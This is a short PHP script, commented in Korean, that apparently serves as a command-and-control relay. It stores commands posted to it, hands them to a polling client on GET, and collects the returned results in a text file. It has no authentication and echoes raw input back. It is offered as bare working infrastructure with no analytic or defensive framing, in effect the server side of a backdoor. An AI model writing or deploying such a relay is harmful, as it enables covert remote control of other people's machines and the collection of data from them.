<?php
// 명령과 결과를 저장할 파일 경로
$commandFile = "upload/commands.txt";
$resultFile = "upload/results.txt";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST["command"])) {
        $command = $_POST["command"];
        file_put_contents($commandFile, $command);
        echo "Command received: " . $command;
    } elseif (isset($_POST["result"])) {
        $result = $_POST["result"];
        file_put_contents($resultFile, $result, FILE_APPEND);
        echo "Result received.";
    }
} else {
    if (file_exists($commandFile)) {
        echo file_get_contents($commandFile);
    } else {
        echo "No command.";
    }
}

if ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET["type"]) && $_GET["type"] === "result") {
    if (file_exists($resultFile)) {
        echo file_get_contents($resultFile);
    } else {
        echo "No results.";
    }
}
?>
